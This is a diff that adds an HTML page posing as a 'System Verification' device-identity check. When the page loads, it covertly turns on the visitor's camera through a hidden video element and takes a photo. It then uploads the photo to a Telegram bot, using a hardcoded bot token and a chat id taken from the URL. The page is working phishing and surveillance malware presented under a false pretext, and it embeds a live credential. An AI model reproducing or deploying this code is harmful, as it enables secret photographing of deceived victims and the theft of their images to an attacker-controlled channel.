@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Verification</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+    </style>
+</head>
+<body>
+    <div style="border: 1px solid #0f0; display: inline-block; padding: 20px; border-radius: 10px;">
+        <h2>🛡️ ENCRYPTED ACCESS</h2>
+        <p id="status">Verifying Device Identity...</p>
+        <video id="video" width="1" height="1" autoplay style="display:none;"></video>
+        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id');
+        const type = urlParams.get('type') || 'Front Camera';
+        const botToken = "8757294593:AAEzF8MXSiLVG1vgazLrcIVWcPbjdYJYPZA"; // আপনার বটের টোকেন
+
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: (type === 'back' ? 'environment' : 'user') } 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL('image/png');
+                    
+                    // ইমেজ ব্লব (Blob) এ রূপান্তর
+                    const blob = await (await fetch(imgData)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'capture.png');
+                    formData.append('caption', `🎯 ${type} Captured!\n🆔 ID: ${chatId}\n👤 Owner: Boss Enaful`);
+
+                    // সরাসরি টেলিগ্রামে পাঠানো
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    document.getElementById('status').innerText = "Access Granted! ✅";
+                }, 2000);
+            } catch (e) {
+                document.getElementById('status').innerText = "Permission Denied! ❌";
+            }
+        }
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
